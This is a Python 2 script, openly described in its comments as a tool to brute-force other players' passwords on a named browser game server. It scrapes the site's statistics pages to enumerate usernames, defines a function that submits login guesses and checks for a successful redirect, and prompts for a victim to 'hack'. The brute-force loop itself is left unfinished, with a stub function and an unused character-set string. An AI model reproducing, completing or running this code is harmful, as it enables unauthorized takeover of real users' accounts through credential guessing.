# brute force some ss-travi users
# first, connect to ur user and let the application get the profiles table
# after that enter the victim profiles
# let the computer do the work

import requests
import time
URL_SERVER     = "http://ss-travi.com/s1"
URL_INDEX      = "/index.php"
URL_VILLAGE1   = "/village1.php"
URL_STATISTICS = "/statistics.php"

s = requests.session()
DELAY_TIME = 0 #in seconds
MIN_PASSWORD_LEN = 6
def wait():
    time.sleep(DELAY_TIME)

def get_profiles():
    print "getting profiles"
    p = 0
    raw_html = ""
    while s.post(URL_SERVER + URL_STATISTICS + "?p=" + str(p)).text.find(">Next") > 0:
        raw_html = raw_html + s.post(URL_SERVER + URL_STATISTICS + "?p=" + str(p)).text
        p = p+1

    raw_html = raw_html + s.post(URL_SERVER + URL_STATISTICS + "?p=" + str(p)).text
    raw_html = raw_html.split('le="">')
    to = len(raw_html) + 1
    raw_html = raw_html[1 : to]
    for i in range(0, len(raw_html)):
        raw_html[i] = raw_html[i].split(' </a')[0].lower()

    profiles = raw_html
    return profiles

def try_password(username,password):
    data = {"login":username, "password":password}
    res = s.post(URL_SERVER + URL_INDEX, data=data)
    if res.url == URL_SERVER + URL_VILLAGE1:
        return True
    else:
        return False
# returns the password found
def hack():
    pass

def usage(func_name, params): #params is list
    print "USAGE:", func_name
    for i in params:
        print "[" + i + "]",


def connect(username, password):
    connect = s.post(URL_SERVER + URL_INDEX, data={'login':username,'password':password})
    if connect.url == URL_SERVER + URL_INDEX:
        print 'cant connect, check the connection data'
    elif connect.text.find("All good things must come to an end") > 0:
        print "Game over"
    elif connect.url == URL_SERVER + URL_VILLAGE1:
        print 'connected successfully'





print "insert your username: ",
username = raw_input()
if username is None:
    raise ValueError("must enter username!")

print "insert your password: ",
password = raw_input()
if password is None:
    raise ValueError("must enter password!")
print "verifying your user..."
connect = s.post(URL_SERVER + URL_INDEX, data={'login':username,'password':password})
if connect.url == URL_SERVER + URL_INDEX:
    print 'cant connect, check the connection data'
elif connect.text.find("All good things must come to an end") > 0:
    print "Game over"
elif connect.url == URL_SERVER + URL_VILLAGE1:
    print 'connected successfully'
    profiles = get_profiles()
    print "enter target: ",
    target = raw_input()
    if target is None:
        raise ValueError("Must enter target!")

    if target.lower() not in profiles:
        print "target doesn't exists"
    else:
        print target + " found.\nsure you want to hack this profile? [y / n]: ",
        ans = raw_input()
        if ans.lower() == 'y':
            "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()-_=+/*-+\\|.,"

        elif ans.lower() == 'n':
            print 'ok goodbye'
        else:
            print 'invalid answer!'
else:
    print "error: unknown response url"
    print "URL: " + connect.url

print '> ',
user_command = raw_input()
while user_command.lower() != 'exit':
    cmd_args = user_command.split(" ")
    if cmd_args[0] == 'connect':
        if len(cmd_args) < 3:
            usage("connect", ["username", "password"])
        elif len(cmd_args) == 3:
            connect(cmd_args[1], cmd_args[2])
    elif cmd_args[0] == 'hack':
        print "hack"
    elif cmd_args[0] == 'help':
        pass
    print '> ',
    user_command = raw_input()
